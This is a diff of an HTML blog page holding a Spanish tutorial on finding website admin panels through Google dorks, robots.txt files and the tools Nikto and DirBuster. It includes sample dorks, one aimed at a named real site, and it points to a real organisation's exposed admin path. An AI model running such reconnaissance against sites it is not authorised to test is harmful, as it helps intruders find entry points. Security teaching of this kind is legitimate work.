+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-10T22:20:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:20 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-IE8FXu03_4Q/UbV36nLdYmI/AAAAAAAAHpA/dCgqoxF051w/s1600/google-lupa--644x362.jpg" height="356" onclick="zoomToggle('640px','400px','100%','100%',this)" width="640" /></div><div class="" style="clear: both; text-align: right;"><u>by hdbreaker</u></div><div class="" style="clear: both; text-align: right;"><br /></div><div style="text-align: left;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">Existen varias formas de encontrar un AdminPanel, en este post trataremos algunas de ellas:</span></div><div style="text-align: left;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"></span><br /><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><b>Reseña:</b></span><br /><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><b>Google Dorks: </b>Comandos de busqueda avanzada del buscador Google</span><br /><br /><pre class="brush: js">” ” (comillas): buscar frase exacta<br />and or not: operadores lógicos “y” o “no”<br />+ y -: incluír y excluír. Ej: jaguar -coches: busca la palabra “jaguar”, pero omite las webs con la palabra “coches”<br />* (asterisco): comodín, cualquier palabra, pero una sóla palabra<br />. (punto): comodín, cualquier palabra, una o muchas<br />intitle o allintitle: la expresión buscada está en el título<br />inurl o allinurl: la expresión buscada está en la url<br />site: sólo busca resultados dentro de la web que va detrás de “site:”<br />filetype: sólo busca archivos de un tipo (doc, xls, txt…)<br />link: sólo busca en páginas que tienen un link a una determinada web<br />inanchor: sólo busca en páginas que tienen en el texto de enlace la expresión buscada<br />cache: muestra el resultado en la cache de Google de una pagina webrelated: busca webs relacionadas con una determinada<br /><br /></pre><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><b>Mediante robots.txt:</b></span></div><div style="text-align: left;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><br /><b>¿Que es el archivo robots.txt?</b></span></div><div style="text-align: left;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">Este fichero sirve para dar instrucciones a las spiders de los buscadores sobre qué contenidos deben rastrear y cuáles no.</span></div><div style="text-align: left;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">Por simple lógica podemos suponer que muchos administradores de sitios web, lo utilizan para evitar visualizaciones indeseadas a carpetas y archivos de administración. El problema es que este archivo casi siempre esta incluido en la carpeta raiz del proyecto, por lo que es accesible con solo cambiar la url:</span><br /><br /><div style="text-align: center;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">&nbsp;</span><img border="0" src="http://imageupper.com/s02/1/2/C14209564721308666_1.png" height="515" onclick="zoomToggle('640px','515px','100%','100%',this)" width="640" /></div><br /><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">En este ejemplo se ve el que se ha prohibido el acceso a la carpeta /padmin a los robots de google (entre otros) y también una mala administración por parte del Fondo Mundial para la Naturaleza.</span></div><br /><div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><br /></div><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><b><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">Mediante Herramientas:</span></b></span><br /><br /><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">Herramientas como Nikto (que además de analizar los  fallos del sitio en busca de vulnerabilidades web, tambien busca los directorios default de  posible lectura) y Dirbuster (fuzzer para buscar por fuerza bruta directorios web) nos simplifican un poco esta tarea:</span></span></span></span></span><br /><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">&nbsp;</span></span></span></span><b><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"> </span></b></span><br /><div class="separator" style="clear: both; text-align: center;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px; margin-left: 1em; margin-right: 1em;"><img border="0" src="http://imageupper.com/s02/1/2/C14209564721308666_2.png" height="208" onclick="zoomToggle('640px','280px','100%','100%',this)" width="640" /></span></div><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><b><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">&nbsp;</span></b><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><br /></span></span></span><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"></span></span><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"> </span></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://blog.vidasconcurrentes.com/wp-content/uploads/2011/10/dirbuster.jpg" height="452" onclick="zoomToggle('640px','452px','100%','100%',this)" width="640" />&nbsp;</div><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: left;"><b><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">Mediante Google Dorks:</span></span></span></b></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;">A mi gusto personal, la forma mas entretenida, productiva e interesante, ya que se pueden encontrar bastante información adicional sobre una empresa u organización, lo importante de este metódo es jugar con todas las posibilidades que nos dan los google dorks y lograr dorks personalizados para nuestro objetivo, algunos ejemplos:</span></span></span><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span">&nbsp;</span></span></span></span></span><br /><br /><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span"> </span></span></span></span></span><br /><pre class="brush: js">inurl:/*admin*.php site:www.rondinerh.com.ar<br />inurl:robots.txt intext:admin<br />inurl:robots.txt intext:admin filetype:txt<br /></pre><div style="text-align: center;"><span class="Apple-style-span" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://imageupper.com/s02/1/2/C14209564721308666_3.png" height="580" onclick="zoomToggle('640px','580px','100%','100%',this)" width="640" /></span><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span"></span></span></span></span><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span"></span></span></span></span></div><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span"><br />Vean el primer resultado... no queda mas que decir.</span></span></span></span></div><div style="text-align: left;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span"><br /></span></span> </span></span></span></div><div style="text-align: center;"><b><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span">Happy Hunting</span></span></span></span></span></b><br /><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span"></span></span></span></span></span><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span" style="font-family: verdana, arial, sans-serif; font-size: 12px; line-height: 16px;"><span class="Apple-style-span"><br /></span></span> </span></span></span></div></div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/11">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
